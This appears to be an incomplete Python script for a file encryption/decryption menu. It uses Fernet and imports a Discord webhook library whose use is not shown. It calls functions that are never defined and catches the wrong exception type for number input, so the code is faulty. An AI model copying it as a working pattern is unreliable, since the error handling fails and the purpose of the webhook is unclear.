from cryptography.fernet import Fernet
from discord_webhook import DiscordWebhook, DiscordEmbed
import sys
import os
import time

while True:

    print("""

        [1] - Encrypt your files
        [2] - Decrypt your files
        [3] - Help

        """)
    
    try:
        X = int(input(" "))
        break
    except SyntaxError:
        print("You need to enter a numbers not a letter you dummy")
        time.sleep(2)
        os.system("cls")
        continue

def choice():

    if X == 1:
        encrypting()
    elif X == 2:
        decrypting()
    elif X == 3:
        help0()